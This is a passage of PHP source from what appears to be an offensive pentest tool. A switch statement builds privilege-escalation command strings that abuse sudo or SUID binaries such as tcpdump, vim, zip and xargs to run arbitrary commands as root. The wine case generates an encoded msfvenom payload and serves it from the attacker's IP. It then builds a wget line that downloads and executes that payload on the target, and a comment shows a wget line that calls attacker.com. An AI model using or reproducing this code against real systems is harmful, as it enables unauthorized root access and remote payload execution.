	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
	                
	                break;
	                
	            case "tcpdump": // OK webdeveloper
	                $data_sudo = "COMMAND='$cmd' && TF=\$(mktemp) && echo \"\$COMMAND\" > \$TF && chmod +x \$TF && $via_sudo $this->file_path -ln -i lo -w /dev/null -W 1 -G 1 -z \$TF ";
	                break;
	                
	            case "tee":
	                $data = "\"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "telnet":
	                $data = "\"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "tftp":
	                $data = "\"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "time":
	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "timeout":
	                $data = "$this->file_path 7d \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "tmux":
	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;

	                
	            case "unexpand":
	                $data = "$this->file_path -t99999999 \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;

	                
	            case "unshare":
	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	                
	            case "vi": // OK lin.Security
	                $data = "$this->file_path -c \":! $via_suid -c $cmd\" /etc/profile 2> /dev/null ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	                
	            case "vim":
	            case "vim.basic":
	                $data = "$this->file_path -c \":! $via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	 
	                
	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec ".addslashes($via_sudo)." $via_suid -c $cmd\")'";
	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_sudo $via_suid -c $cmd\")'";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "watch":
	                $data = "$this->file_path -x sh -c \"$via_suid -c $cmd 1>&0 2>&0\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	            case "wget":
	                $cmd = trim($cmd);
	                /*
	                 export URL=http://attacker.com/file_to_get
	                 export LFILE=file_to_save
	                 sudo -E wget $URL -O $LFILE
	                 */
	                $data_sudo = "\"$via_suid -c $cmd\" ";
	                break;
	                
	            case "whois":
	                $data_sudo = "\"$via_suid -c $cmd\" ";
	                break;
	             
	                
	            case "wine":
	                $file_path = "$this->dir_tmp/$sha1_hash.exe";
	                
	                $query = "msfvenom --payload windows/exec cmd=\"$cmd\"  LHOST=$attacker_ip LPORT=$attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format exe -o $file_path";
	                if (!file_exists($file_path)) $this->requette($query);
	                else $this->cmd($attacker_ip,$query);
	                
	               
	                $this->tcp2open4server($attacker_ip, $this->port_rfi);
	                
	                $data = "wget http://$attacker_ip:$this->port_rfi/$file_path -o ./$sha1_hash.exe ; echo '%ID%' > /tmp/req.txt ;$this->file_path ./$sha1_hash.exe <  /tmp/req.txt";
	                $data_sudo = "wget http://$attacker_ip:$this->port_rfi/$file_path -o ./$sha1_hash.exe ; echo '%ID%' > /tmp/req.txt ;$via_sudo $this->file_path ./$sha1_hash.exe <  /tmp/req.txt ";
	                break ;
	                
	            case "wish":
	                $cmd = trim($cmd);
	                /*
	                 wish
	                 exec $via_suid  <@stdin >@stdout 2>@stderr
	                 */
	                $data_sudo = "\"$via_suid -c $cmd\" ";
	                break;
	                
	            case "xargs":
	                $data = "$this->file_path -a /dev/null \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;

	            case "yum":
	                $data_sudo = "\"$via_suid -c $cmd\" ";
	                break;
	                
	            case "zip":
	                $data = "$this->file_path /tmp/test.zip /tmp/test -T --unzip-command=\"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	                
	            case "zsh": // OK lin.Security
	                $data = "$this->file_path -c \"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	                
	                
	                
	            case "zypper":
	                $data = "\"$via_suid -c $cmd\" ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	           
	                
	        }
	        
	        if($sudo) $data_rst = $data_sudo ;
	        else $data_rst = $data ;

	        //$this->article("DATA", $data_rst);
	    return $data_rst ;
	}
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
}
?>